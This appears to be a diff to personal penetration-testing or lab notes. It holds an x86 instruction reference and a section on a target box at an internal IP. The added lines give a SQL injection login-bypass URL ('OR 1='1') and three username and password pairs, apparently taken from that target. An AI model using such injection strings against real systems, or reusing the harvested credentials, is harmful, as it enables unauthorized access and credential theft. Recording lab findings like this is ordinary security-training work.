@@ -328,7 +328,7 @@ ADD
 Add source to destination
 SUB
 Subtract source from destination
-CMP
+CMP•••••••••••••••
 Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
 JMP
 Jump to specified location
@@ -732,4 +732,32 @@ line 601 is the masked
 
 traget box
 10.50.22.50
+
+Plug into Url for info
+/login.php?username=tom' OR 1='1 & passwd=tom' OR 1='1
+
+
+
+user2
+RntyrfVfNER78
+user3
+Obo4GURRnccyrf
+Lee_Roth
+anotherpassword4THEages
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
